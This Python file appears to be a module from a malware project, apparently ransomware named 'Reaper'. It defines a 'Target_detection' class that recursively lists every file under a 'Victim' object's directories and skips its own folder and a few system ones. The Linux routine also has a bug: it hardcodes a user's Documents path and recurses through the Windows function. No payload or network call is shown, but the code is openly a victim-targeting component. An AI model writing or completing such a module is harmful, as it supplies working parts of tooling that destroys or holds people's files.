import os
from Victim import Victim


class Target_detection:
    def __init__(self, victim):
        self.target_path = victim.get_target_dir()
        self.targets = []

    def gather_targets_windows(self, target_path=None):
        folders = []

        if target_path is None:
            target_path = self.target_path

        try:
            for item in os.scandir(target_path):
                name = item.path.split("\\")[-1]

                if os.path.isdir(item.path):
                    if name == "My Music" or name == "My Videos" or name == "My Pictures" or name == ".git" or \
                            name == "Reaper":
                        continue
                    else:
                        folders.append(item)
                else:
                    self.targets.append(item.path)

            for item in folders:
                self.gather_targets_windows(item.path)
        except PermissionError:
            print("Failed to access due to permission error...")

        return self.targets

    def gather_targets_linux(self, target_path=None):
        folders = []

        if target_path is None:
            target_path = "/home/snak/Documents"

        try:
            for item in os.scandir(target_path):
                name = item.path.split("/")[-1]

                if os.path.isdir(item.path):
                    if name == "Reaper" or name == ".git" or name == "__pycache__":
                        continue
                    else:
                        folders.append(item)
                else:
                    self.targets.append(item.path)


            for item in folders:
                self.gather_targets_windows(item.path)

        except PermissionError:
            print("Failed to access due to permission error...")

        return self.targets

if __name__ == '__main__':
    tr = Target_detection(Victim())
    # tr.gather_targets_linux()
    # print(tr.target_path)
    # print(tr.targets)
